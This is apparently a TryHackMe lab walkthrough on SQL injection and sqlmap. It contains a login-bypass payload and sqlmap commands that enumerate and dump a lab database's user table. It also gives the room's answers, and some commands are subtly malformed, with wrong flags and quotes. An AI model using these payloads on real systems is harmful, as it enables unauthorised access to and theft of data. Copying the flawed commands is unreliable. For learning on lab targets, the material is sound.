# SQLMap: the Basics Tryhackme Walkthrough 

Room URL: https://tryhackme.com/room/sqlmapthebasics


---
## Task 1: Introduction

### What is SQL injection (SQLi)?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

Source: [portswigger](https://portswigger.net/web-security/sql-injection)

**Question: Which language builds the interaction between a website and its database?**

**Answer:** sql

---

## Task 2: SQL Injection Vulnerability

Imagine you’re logging into a website, trying to get through a login page with your trusty username "John" and secret password "Un@detectable444." Typically, the website sends a query to the database, which looks a bit like this:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

The database checks if you exist and whether that password matches. If yes, you’re in! But hackers have a trick up their sleeve called **SQL Injection** that lets them twist this query into something that works for them.

Let’s say this login page is sloppy with security and doesn’t clean up user input properly. An attacker could type something like:

**Username:** John  
**Password:** abc' OR 1=1;-- -

Now the query becomes:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

The password part now reads:

- Password = 'abc' (no match)
- OR 1=1 (which is always true!)

So the database just shrugs and lets them in. The `--` tells the database to ignore the rest, bypassing the real password check.

**Lesson Learned:** Clean up your input fields, or you might just hand out the keys to the kingdom, courtesy of SQL Injection!

**Question: Which boolean operator checks if at least one side of the operator is true for the condition to be true?**

**Answer:** or

**Question: Is 1=1 in an SQL query always true? (YEA/NAY)**

**Answer:** Yea

---

## Task 3: Automated SQL Injection Tool

Feeling like hacking databases is too much typing? Enter **SQLMap**, the database burglar’s best friend.

Forget trying to break in manually — SQLMap does the hard work for you. It’s like a tour guide for database heists, handling everything from picking the lock to finding the treasure.

**SQLMap** is a command-line tool that turns you into a database wizard, as long as you have permission (seriously). Start by launching it in your Linux terminal, and if you’re feeling overwhelmed, try `--wizard` mode. Think of it as SQLMap holding your hand.

Want to test a URL for weakness? Just feed it a target URL, like:

```
sqlmap -u http://sqlmaptesting.thm/search?cat=1
```

SQLMap will dig in. If it finds a weak point, it’ll reveal the details: error-based, time-based, UNION query, etc.

Once you’ve confirmed a vulnerable URL:

- Use `--dbs` to list the databases
- Use `-D` to pick one
- Use `--tables` to browse inside
- Use `--dump` to get all the records

In a few commands, you’re a digital Indiana Jones uncovering the secrets of SQL!

**Question: Which flag in the SQLMap tool is used to extract all the databases available?**

**Answer:** --dbs

**Question: What would be the full command of SQLMap for extracting all tables from the “members” database?**  
**(Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)**

**Answer:**
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```

---
# TASK 4: Practical Exercise

### Extract the Full GET Request URL:
To view GET parameters, right-click on the page and select “Inspect.”

Go to the Network tab, enter dummy credentials (e.g., email=test and password=test), and hit login.

Locate the GET request; it will look like this:

`http://MACHINE_IP/ai/includes/user_login?email=test&password=test`

Copy this URL, as it includes the GET parameters.

### SQLMap Command Setup:
In the terminal, use the SQLMap tool with this command (substitute MACHINE_IP with the IP address displayed in your AttackBox):

`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' - level=5`

Wrapping the URL in single quotes (‘ ‘) avoids issues with special characters.

### Answering SQLMap Prompts:
When SQLMap asks questions, respond as follows:

- Skip test payloads for other DBMSes: Enter `y`.
- Include all MySQL-specific tests: Enter `y`.
- Try random integer values for ‘–union-char’: Enter `y`.
- Keep testing other parameters if email is vulnerable: Enter `n`.

### SQLMap Results:
After running, SQLMap should identify SQL injection vulnerabilities in the email parameter.

**Question 1: How many databases are available in this web application?**

`sqlmap -u “http://<target-ip>/ai/includes/user_login?email=test&password=test” --dbs -level=5`

**Answer:** 6

**Question 2 : What is the name of the table available in the “ai” database?**

`sqlmap -u “http://<target-ip>/ai/includes/user_login?email=test&password=test” -D ai --tables`

**Answer:** Users

**Question 3 : What is the password of the email test@chatai.com?**

from the ai database dump the Users table

`sqlmap -u "http://<target-ip>/ai/includes/user_login?email=test&password=test" -D ai -T user --dump -level=5`

![image](https://github.com/user-attachments/assets/ab97d5ea-0c98-4ef1-b9af-2e8e53040d85)

**Answer:** 12345678
